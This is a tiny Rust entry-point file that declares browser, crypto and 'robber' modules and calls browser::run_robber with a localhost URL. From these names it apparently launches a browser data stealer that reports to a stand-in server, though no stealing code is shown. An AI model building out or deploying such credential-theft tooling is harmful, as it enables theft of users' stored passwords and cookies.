mod browser;
mod crypto;
mod robber;

fn main() -> () {
    let url = "http://127.0.0.1";
    let _ = browser::run_robber(true, true, url);
}
